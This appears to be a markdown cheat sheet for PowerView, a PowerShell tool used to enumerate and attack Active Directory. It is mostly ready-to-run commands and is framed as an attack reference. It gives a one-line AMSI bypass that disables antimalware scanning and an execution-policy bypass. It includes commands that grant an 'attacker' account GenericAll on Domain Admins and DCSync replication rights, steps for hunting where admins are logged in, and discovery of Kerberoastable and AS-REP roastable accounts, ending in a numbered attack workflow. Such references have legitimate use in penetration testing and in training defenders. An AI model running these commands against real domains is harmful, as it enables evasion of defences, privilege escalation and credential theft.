# ⚡ PowerView - PowerShell AD Enumeration

```
  ██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ██╗   ██╗██╗███████╗██╗    ██╗
  ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██║   ██║██║██╔════╝██║    ██║
  ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝██║   ██║██║█████╗  ██║ █╗ ██║
  ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██║██╔══╝  ██║███╗██║
  ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║ ╚████╔╝ ██║███████╗╚███╔███╔╝
  ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝ ╚══╝╚══╝ 
                  PowerShell Active Directory Recon
```

<p align="center">
  <img src="https://img.shields.io/badge/PowerView-Active_Directory-blue?style=for-the-badge" alt="PowerView">
  <img src="https://img.shields.io/badge/PowerShell-red?style=for-the-badge" alt="PowerShell">
</p>

---

## 📋 Table of Contents

- [What is PowerView](#-what-is-powerview)
- [Setup](#-setup)
- [Domain Enumeration](#-domain-enumeration)
- [User Enumeration](#-user-enumeration)
- [Group Enumeration](#-group-enumeration)
- [Computer Enumeration](#-computer-enumeration)
- [ACL Enumeration](#-acl-enumeration)
- [Trust Enumeration](#-trust-enumeration)
- [GPO Enumeration](#-gpo-enumeration)
- [Hunting](#-hunting)
- [Quick Reference](#-quick-reference)

---

## 🎯 What is PowerView

**PowerView** is a PowerShell tool for AD enumeration and exploitation:

- 🔍 **Enumeration** - Users, groups, computers, GPOs
- 🔐 **ACLs** - Find misconfigured permissions
- 🌐 **Trusts** - Map domain relationships
- 🎯 **Hunting** - Find where users are logged in

---

## 🚀 Setup

### Download PowerView

```powershell
# From PowerSploit
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

# From SharpHound
# PowerView.ps1 included with BloodHound
```

### Import Module

```powershell
# Bypass execution policy
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

# Import
Import-Module .\PowerView.ps1

# Or dot source
. .\PowerView.ps1
```

### AMSI Bypass (if needed)

```powershell
# Simple bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

---

## 🏢 Domain Enumeration

### Basic Domain Info

```powershell
# Get domain info
Get-Domain

# Get domain SID
Get-DomainSID

# Get domain policy
Get-DomainPolicy

# Get domain controllers
Get-DomainController
Get-DomainController -Domain other.domain.local

# Get forest info
Get-Forest
Get-ForestDomain
```

### Domain Policy

```powershell
# Password policy
(Get-DomainPolicy)."SystemAccess"

# Kerberos policy
(Get-DomainPolicy)."KerberosPolicy"
```

---

## 👤 User Enumeration

### List Users

```powershell
# All users
Get-DomainUser

# Specific user
Get-DomainUser -Identity admin

# User properties
Get-DomainUser -Identity admin -Properties *
Get-DomainUser -Identity admin -Properties samaccountname,description

# Users with descriptions
Get-DomainUser -LDAPFilter "(description=*)" | Select-Object samaccountname,description
```

### Find Interesting Users

```powershell
# Users with SPN (Kerberoastable)
Get-DomainUser -SPN

# Users without preauth (AS-REP)
Get-DomainUser -PreauthNotRequired

# Admin count users (protected)
Get-DomainUser -AdminCount

# Users with passwords in description
Get-DomainUser -LDAPFilter "(description=*pass*)" | Select-Object samaccountname,description
```

### User Sessions

```powershell
# Where is user logged in
Find-DomainUserLocation -UserIdentity admin

# Find users with admin access
Find-LocalAdminAccess
```

---

## 👥 Group Enumeration

### List Groups

```powershell
# All groups
Get-DomainGroup

# Specific group
Get-DomainGroup -Identity "Domain Admins"

# Group members
Get-DomainGroupMember -Identity "Domain Admins"

# Recursive members
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

### Important Groups

```powershell
# Domain Admins
Get-DomainGroupMember -Identity "Domain Admins"

# Enterprise Admins
Get-DomainGroupMember -Identity "Enterprise Admins"

# Administrators
Get-DomainGroupMember -Identity "Administrators"

# Find groups user belongs to
Get-DomainGroup -UserName admin
```

### Local Groups

```powershell
# Local admins on machine
Get-NetLocalGroupMember -ComputerName server01

# Local admins everywhere
Find-DomainLocalGroupMember -GroupName Administrators
```

---

## 💻 Computer Enumeration

### List Computers

```powershell
# All computers
Get-DomainComputer

# Specific computer
Get-DomainComputer -Identity server01

# Properties
Get-DomainComputer -Properties operatingsystem,serviceprincipalname

# Computers with unconstrained delegation
Get-DomainComputer -Unconstrained
```

### Find Targets

```powershell
# Domain Controllers
Get-DomainController

# Servers
Get-DomainComputer -OperatingSystem "*Server*"

# Windows 10
Get-DomainComputer -OperatingSystem "*Windows 10*"

# Old OS
Get-DomainComputer -OperatingSystem "*2008*"
```

### Shares

```powershell
# Find shares
Find-DomainShare

# Writable shares
Find-DomainShare -CheckShareAccess

# Interesting files in shares
Find-InterestingDomainShareFile
Find-InterestingDomainShareFile -Include *.txt,*.doc,*.xlsx
```

---

## 🔐 ACL Enumeration

### Basic ACL

```powershell
# ACL for user
Get-DomainObjectAcl -Identity admin

# Resolve GUIDs
Get-DomainObjectAcl -Identity admin -ResolveGUIDs

# Specific rights
Get-DomainObjectAcl -Identity admin -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll"}
```

### Find Interesting ACLs

```powershell
# GenericAll on user
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll" -and $_.SecurityIdentifier -match "S-1-5-21-.*-1107"}

# WriteProperty
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty"}

# WriteDacl
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteDacl"}
```

### DCSync Rights

```powershell
# Find DCSync rights
Get-DomainObjectAcl -SearchBase "DC=domain,DC=local" -ResolveGUIDs | ? {($_.ObjectAceType -match "Replication-Get") -or ($_.ActiveDirectoryRights -match "GenericAll")}
```

### Modify ACL

```powershell
# Add GenericAll for user
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker -Rights All

# Add DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

---

## 🤝 Trust Enumeration

### Domain Trusts

```powershell
# Get trusts
Get-DomainTrust

# All trusts
Get-DomainTrust -Domain domain.local

# Map all trusts
Get-DomainTrustMapping
```

### Forest Trusts

```powershell
# Forest trusts
Get-ForestTrust

# Forest domains
Get-ForestDomain
```

### Trust Types

| Trust Type | Direction | Description |
|------------|-----------|-------------|
| Bidirectional | Two-way | Both domains trust each other |
| Inbound | One-way | Other domain trusts us |
| Outbound | One-way | We trust other domain |

---

## 📜 GPO Enumeration

### List GPOs

```powershell
# All GPOs
Get-DomainGPO

# GPO by name
Get-DomainGPO -Identity "Default Domain Policy"

# GPOs on specific OU
Get-DomainGPO -ComputerIdentity server01
```

### Find GPO Permissions

```powershell
# GPO that user can modify
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty" -or $_.ActiveDirectoryRights -match "GenericAll"}
```

### GPO Locations

```powershell
# OUs where GPO applies
Get-DomainOU -GPLink "{GPO-GUID}"

# GPO on specific computer
Get-DomainGPO -ComputerIdentity "server01"
```

---

## 🎯 Hunting

### Find Admin Access

```powershell
# Where do we have local admin?
Find-LocalAdminAccess

# With threading
Find-LocalAdminAccess -Threads 10

# On specific computers
Find-LocalAdminAccess -ComputerFile computers.txt
```

### Find User Locations

```powershell
# Where is user logged in?
Find-DomainUserLocation

# Specific user
Find-DomainUserLocation -UserIdentity admin

# Only computers where we have access
Find-DomainUserLocation -CheckAccess
```

### Find Sessions

```powershell
# Sessions on machine
Get-NetSession -ComputerName dc01

# Logged on users
Get-NetLoggedon -ComputerName server01

# RDP sessions
Get-NetRDPSession -ComputerName server01
```

### Hunt Specific Users

```powershell
# Find Domain Admins
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# Check where they're logged in
Invoke-UserHunter

# Stealth mode
Invoke-UserHunter -Stealth
```

---

## 📊 Quick Reference

### Essential Commands

| Command | Description |
|---------|-------------|
| `Get-Domain` | Domain info |
| `Get-DomainUser` | List users |
| `Get-DomainGroup` | List groups |
| `Get-DomainComputer` | List computers |
| `Get-DomainController` | List DCs |
| `Get-DomainTrust` | List trusts |
| `Get-DomainGPO` | List GPOs |
| `Find-LocalAdminAccess` | Find admin access |
| `Find-DomainUserLocation` | Find user sessions |

### Kerberos Targets

| Command | Description |
|---------|-------------|
| `Get-DomainUser -SPN` | Kerberoastable |
| `Get-DomainUser -PreauthNotRequired` | AS-REP roastable |
| `Get-DomainComputer -Unconstrained` | Unconstrained delegation |

### Common Filters

```powershell
# Filter by property
Get-DomainUser -Properties samaccountname,description

# LDAP filter
Get-DomainUser -LDAPFilter "(description=*admin*)"

# Where clause
Get-DomainUser | ? {$_.samaccountname -like "*svc*"}
```

### Attack Workflow

```powershell
# 1. Import
Import-Module .\PowerView.ps1

# 2. Enumerate domain
Get-Domain
Get-DomainController

# 3. Find users
Get-DomainUser -SPN | Select samaccountname
Get-DomainUser -PreauthNotRequired

# 4. Find admin access
Find-LocalAdminAccess

# 5. Hunt users
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# 6. Check ACLs
Get-DomainObjectAcl -Identity admin -ResolveGUIDs
```

---

## 📚 Resources

- [PowerView GitHub](https://github.com/PowerShellMafia/PowerSploit)
- [HarmJ0y Blog](https://blog.harmj0y.net/)
- [PowerView Cheat Sheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

### Related Cheatsheets
- [BloodHound](../BloodHound/README.md)
- [PowerShell](../PowerShell/README.md)
- [Mimikatz](../Mimikatz/README.md)

---

<p align="center">
  <b>⚡ PowerShell AD Recon!</b><br>
  <i>PowerView - The OG AD enumeration tool</i>
</p>
